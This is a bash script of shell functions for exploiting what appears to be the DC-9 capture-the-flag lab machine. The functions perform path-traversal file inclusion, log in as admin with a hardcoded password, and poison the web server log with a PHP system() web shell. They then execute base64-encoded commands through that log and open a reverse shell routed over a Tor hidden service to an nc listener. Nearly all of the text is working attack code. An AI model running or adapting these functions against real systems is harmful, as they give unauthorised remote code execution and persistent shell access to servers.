#!/bin/bash
#
# Source this in .bashrc
# IMPORTANT: Set DC9 var
#

#DC9=<IP>
DC9_POISON_VAR="cmd"
DC9_POISON_CODE='<?php echo('"'"'<pre>'"'"');system(base64_decode($_GET['"'"$DC9_POISON_VAR"'"']));echo('"'"'</pre>'"'"'); ?>'
HIDDEN_SRV_TOR=$(cat /opt/tor-kiddie-hidden-service/hostname)


DC9=${DC9:-dc9}

alias dc9-config="vim \"$(readlink -f ${BASH_SOURCE[0]})\" && echo -n \"Sourcing file...\" && source \"$(readlink -f ${BASH_SOURCE[0]})\" && echo \"Done\""

function dc9-lfi(){
  curltor -s -b "$DC9_COOKIE" http://$DC9/manage.php?file=../../../../..$@ \
      | awk 'NR==1{print $0} /<\/div>/{i=0} /File does not exist<br \/>/{i=1}i' | sed 's/.*<br \/>//g'

}

function dc9-login-admin(){
  OUT=$( curl -i -s -k -X $'POST' \
      --data-binary $'username=admin&password=transorbital1' \
      'http://'$DC9'/manage.php' | awk 'NR==1{print $0} /PHPSESSID/{print $2}'
    )
  echo "$OUT" | head -1
  export DC9_COOKIE=$(echo "$OUT" | tail -1 | tr -d ';')
}

function dc9-poisonlog(){
  curltor -i -s  -H "User-Agent: $DC9_POISON_CODE" "http://$DC9/" | head -1
}

function dc9-cmd() {
  curltor -i -s -k -X GET -b "$DC9_COOKIE" \
    "http://$DC9/welcome.php?file=../../../../var/log/httpd/access_log&${DC9_POISON_VAR}=$( echo "echo;bash -c '$@' 2>&1" | base64 -w0 )" | awk 'NR==1{print $0}  /<pre>/{i=1;next} /<\/pre>/{i=0}i';
}

function dc9-cmd-interactive () {
    while read -p 'DC9> ' -ra c; do
        dc9-cmd "${c[@]}"
    done
}

function dc9-reverse-shell(){
  dc9-cmd "cd /var/lib/httpd/; ./offensive-tor-toolkit/reverse-shell-over-tor -listener $HIDDEN_SRV_TOR:1234" &
  nc -lnvp 1234
}
